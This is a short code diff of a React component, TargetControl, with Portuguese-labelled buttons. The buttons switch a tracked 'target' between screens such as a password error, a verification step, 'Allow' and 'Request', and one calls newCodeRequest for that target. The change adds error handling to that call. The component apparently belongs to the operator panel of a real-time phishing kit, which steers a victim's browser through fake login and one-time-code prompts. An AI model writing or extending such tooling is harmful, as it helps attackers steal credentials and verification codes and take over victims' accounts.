@@ -100,8 +100,12 @@ export function TargetControl() {
         <button onClick={() => updateTarget(targetId, { page: 2 })}>Erro de Senha</button>
         <button onClick={async () => {
           updateTarget(targetId, { page: 3 });
-          await newCodeRequest(targetId, "");
-          console.log("Clicou no botão de verificação");
+          try {
+            const resp = await newCodeRequest(targetId, "");
+            console.log("Clicou no botão de verificação, resposta:", resp);
+          } catch (err) {
+            console.error("Erro ao criar novo code:", err);
+          }
         }}>Verificação</button>
         <button onClick={() => updateTarget(targetId, { page: 4 })}>Permitir</button>
         <button onClick={() => updateTarget(targetId, { page: 5 })}>Requisitar</button>
